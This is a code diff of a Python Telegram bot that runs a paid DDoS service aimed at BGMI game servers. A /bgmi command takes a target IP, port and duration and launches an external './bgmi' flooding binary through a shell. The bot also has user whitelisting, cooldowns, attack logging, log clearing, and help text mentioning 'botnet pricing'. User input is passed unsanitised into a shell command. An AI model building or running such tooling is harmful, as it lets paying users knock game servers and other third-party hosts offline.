@@ -18,8 +18,8 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
-# Dictionary to track active attacks
-active_attacks = {}
+# List to store allowed user IDs
+allowed_user_ids = []  # This should be populated by reading the USER_FILE
 
 # Function to read user IDs from the file
 def read_users():
@@ -29,115 +29,140 @@ def read_users():
     except FileNotFoundError:
         return []
 
-# List to store allowed user IDs
 allowed_user_ids = read_users()
 
-# Function to log commands
-def log_command(user_id, target, port, time_duration):
+# Function to log command to the file
+def log_command(user_id, target, port, time):
     user_info = bot.get_chat(user_id)
-    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
+    if user_info.username:
+        username = "@" + user_info.username
+    else:
+        username = f"UserID: {user_id}"
     
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-# Dictionary to track cooldown for the /bgmi command
+# Function to handle the reply when free users run the /bgmi command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @Indivual1X"
+    bot.reply_to(message, response)
+
+# Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-# **START ATTACK COMMAND**
+# Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
-    
     if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # Check cooldown (5 minutes)
+            # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                bot.reply_to(message, "You are on cooldown. Please wait 5 minutes before starting another attack.")
+                response = "You Are On Cooldown. Please Wait 5 Minutes Before Running The /bgmi Command Again."
+                bot.reply_to(message, response)
                 return
-            
+            # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
-
+        
         command = message.text.split()
-        if len(command) == 4:
+        if len(command) == 4:  # Updated to accept target, time, and port
             target = command[1]
-            port = int(command[2])
-            time_duration = int(command[3])
+            port = int(command[2])  # Convert port to integer
+            time_duration = int(command[3])  # Convert time to integer
 
             if time_duration > 500:
-                bot.reply_to(message, "Error: Time interval must be less than 500 seconds.")
+                response = "Error: Time interval must be less than 500 seconds."
+                bot.reply_to(message, response)
                 return
 
+            # Log the command and its details
             log_command(user_id, target, port, time_duration)
+            start_attack_reply(message, target, port, time_duration)  # Send start attack reply
 
-            response = f"🚀 **Attack Started!**\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏳ Duration: {time_duration} seconds\n⚡ Method: BGMI\nBy @Indivual1X"
-            bot.reply_to(message, response)
-
+            # Full command to run the BGMI attack (you need to update it according to your BGMI attack command)
             full_command = f"./bgmi {target} {port} {time_duration} 500"
+
+            # Run the BGMI command in the background using subprocess.Popen
             process = subprocess.Popen(full_command, shell=True)
 
-            active_attacks[user_id] = process  # Store process to stop later
-
-            # Wait for the attack duration
+            # Sleep for the specified duration to allow the attack to run
             time.sleep(time_duration)
 
-            # Stop the attack after the time duration
+            # Terminate the attack after the specified time duration
             process.terminate()
-            del active_attacks[user_id]  # Remove from active list
 
-            bot.reply_to(message, f"✅ **Attack Finished!**\n🎯 Target: {target}\n🔌 Port: {port}\n⏳ Duration: {time_duration} seconds.")
-
+            # Send a message when the attack is finished
+            bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time_duration} seconds.")
         else:
-            bot.reply_to(message, "⚠ **Usage:** `/bgmi <target> <port> <time>`\nBy @Indivual1X")
+            response = "Usage: /bgmi <target> <port> <time>\nBy @Indivual1X"
+            bot.reply_to(message, response)
     else:
-        bot.reply_to(message, "🚫 You are not authorized to use this command.\nBy @Indivual1X")
+        response = "You Are Not Authorized To Use This Command.\nBy @Indivual1X"
+        bot.reply_to(message, response)
 
-
-# **STOP ATTACK COMMAND**
-@bot.message_handler(commands=['stopattack'])
-def stop_attack(message):
+# Admin Commands Handlers
+@bot.message_handler(commands=['add'])
+def add_user(message):
     user_id = str(message.chat.id)
-    
-    if user_id in active_attacks:
-        active_attacks[user_id].terminate()  # Stop attack process
-        del active_attacks[user_id]  # Remove from active list
-        bot.reply_to(message, "🚨 Attack Stopped Successfully!")
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_add = command[1]
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                response = f"User {user_to_add} Added Successfully."
+            else:
+                response = "User already exists."
+        else:
+            response = "Please specify a user ID to add."
     else:
-        bot.reply_to(message, "⚠ No active attack found for you.")
+        response = "Only Admin Can Run This Command."
+    bot.reply_to(message, response)
 
-# Handler for /id command
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    bot.reply_to(message, f"🆔 **Your ID:** `{message.chat.id}`")
+@bot.message_handler(commands=['remove'])
+def remove_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user_id in allowed_user_ids:
+                        file.write(f"{user_id}\n")
+                response = f"User {user_to_remove} removed successfully."
+            else:
+                response = f"User {user_to_remove} not found in the list."
+        else:
+            response = "Please Specify A User ID to Remove."
+    else:
+        response = "Only Admin Can Run This Command."
+    bot.reply_to(message, response)
 
-# Handler for /help command
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    help_text = '''📌 **Available Commands:**
-✅ `/bgmi <target> <port> <time>` → Start attack.
-✅ `/stopattack` → Stop attack manually.
-✅ `/id` → Show your user ID.
-✅ `/rules` → View attack rules.
-✅ `/mylogs` → Check recent attack logs.
-✅ `/plan` → Check botnet pricing.
+@bot.message_handler(commands=['clearlogs'])
+def clear_logs_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(LOG_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "Logs are already cleared. No data found."
+                else:
+                    file.truncate(0)
+                    response = "Logs Cleared Successfully"
+        except FileNotFoundError:
+            response = "Logs are already cleared."
+    else:
+        response = "Only Admin Can Run This Command."
+    bot.reply_to(message, response)
 
-🔐 **Admin Commands:**
-🛠 `/add <userId>` → Add a user.
-🛠 `/remove <userId>` → Remove a user.
-🛠 `/allusers` → List all authorized users.
-🛠 `/logs` → Show all user logs.
-🛠 `/broadcast <message>` → Send a message to all users.
-🛠 `/clearlogs` → Clear logs.
-
-By @Indivual1X
-'''
-    bot.reply_to(message, help_text, parse_mode="Markdown")
-
-# Handler for /start command
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f"👋 **Welcome, {user_name}!**\nType `/help` to see available commands.\nBy @Indivual1X"
-    bot.reply_to(message, response, parse_mode="Markdown")
-
-# Polling
+# Polling the bot
 bot.polling()
